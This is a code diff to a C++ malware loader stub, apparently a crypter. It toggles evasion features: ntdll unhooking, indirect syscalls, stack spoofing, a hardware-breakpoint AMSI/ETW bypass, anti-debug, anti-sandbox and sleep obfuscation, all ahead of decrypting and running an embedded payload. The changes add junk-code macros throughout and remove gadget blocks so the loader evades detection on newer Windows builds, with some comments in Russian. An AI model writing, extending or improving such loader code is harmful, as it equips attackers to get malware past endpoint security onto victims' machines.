@@ -124,7 +124,7 @@ __declspec(allocate(".xthrx")) StubConfig GlobalConfig   = {
     false,  // MotwStrip
     false,  // AntiEmulation
     false,  // StagedLoad
-    true,   // KnownDllsUnhook
+    false,  // KnownDllsUnhook (Win11 24H2 VBS/HVCI hang — use RefreshNtdll)
     true,   // StackSpoof
     false,  // AntiMemScan
     false,  // RemoteInjection
@@ -188,36 +188,6 @@ __declspec(allocate(".xthrx")) ResearchBlock ResearchData = {
     { 0 }
 };
 
-// ── Spoof gadget block: struct prevents linker reordering ──
-struct SpoofBlock {
-    char marker[8];
-    DWORD count;
-    unsigned char gadgets[512];
-};
-static_assert(offsetof(SpoofBlock, count) == 8, "SpoofBlock::count must be at offset 8");
-static_assert(offsetof(SpoofBlock, gadgets) == 12, "SpoofBlock::gadgets must be at offset 12");
-
-__declspec(allocate(".xthrx")) SpoofBlock SpoofData = {
-    "XSPOOF",
-    0,
-    { 0 }
-};
-
-// ── Indirect gadget block: struct prevents linker reordering ──
-struct GadgetBlock {
-    char marker[8];
-    DWORD count;
-    unsigned char gadgets[256];
-};
-static_assert(offsetof(GadgetBlock, count) == 8, "GadgetBlock::count must be at offset 8");
-static_assert(offsetof(GadgetBlock, gadgets) == 12, "GadgetBlock::gadgets must be at offset 12");
-
-__declspec(allocate(".xthrx")) GadgetBlock GadgetData = {
-    "XGADGT",
-    0,
-    { 0 }
-};
-
 
 // ═══════════════════════════════════════════════════════════════
 //  MAIN ENTRY — No UAC manifest, runs as standard user
@@ -241,10 +211,11 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     if (!Protection::VerifyIntegrity()) {
         return 0;
     }
-    Protection::JunkCode();
+    JUNK_CODE();
 
     // ── Step 0c: Initialize CRC32C detection ──
     Crc32C::DetectSse42();
+    JUNK_CODE();
 
     // ── Step 1: Unhook ntdll ──
     if (GlobalConfig.bKnownDllsUnhook) {
@@ -252,12 +223,14 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     } else {
         Unhook::RefreshNtdll();
     }
+    JUNK_CODE();
 
     // ── Step 1b: Scan for indirect syscall gadgets ──
     if (GlobalConfig.bIndirectSyscalls) {
         GadgetPool::Scan();
         Syscall::Init();
     }
+    JUNK_CODE();
 
     // ── Step 1c: Initialize Stack Spoofing ──
     if (GlobalConfig.bStackSpoof) {
@@ -265,17 +238,15 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
 
     // ── Step 2a: Unified VEH Dispatcher ──
-    // Один VEH-обработчик для PatchlessBypass и GuardPage
     if (GlobalConfig.bPatchlessAmsiEtw || GlobalConfig.bGuardPage) {
         VehDispatcher::Init();
     }
 
     // ── Step 2b: Patchless AMSI/ETW Bypass ──
-    // Аппаратные точки останова на AmsiScanBuffer/EtwEventWrite
-    // Ноль байт модифицировано в памяти — EDR видит оригинальный код
     if (GlobalConfig.bPatchlessAmsiEtw) {
         PatchlessBypass::Enable();
     }
+    JUNK_CODE();
 
     // ── Step 3: Anti-Analysis ──
     if (GlobalConfig.bAntiDebug) {
@@ -290,6 +261,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         if (Evasion::AntiSandbox::Check())
             return 0;
     }
+    JUNK_CODE();
 
     // ── Step 4: Sleep Obfuscation (initial delay to outlast sandboxes) ──
     if (GlobalConfig.bEkkoSleep) {
@@ -333,6 +305,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
     if (PayloadData.size == 0 || PayloadData.size > sizeof(PayloadData.data))
         return 0;
+    JUNK_CODE();
 
     if (GlobalConfig.bEntropyNorm && PayloadData.size > 1 && PayloadData.data[0] == 0xEE) {
         decryptSize = PayloadData.size - 1;
@@ -377,6 +350,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         }
     }
 
+    JUNK_CODE();
 
     // ── Step 8b: Anti-Memory Scanning (L14 + L16) ──
     // Трёхуровневая защита от сканеров памяти:
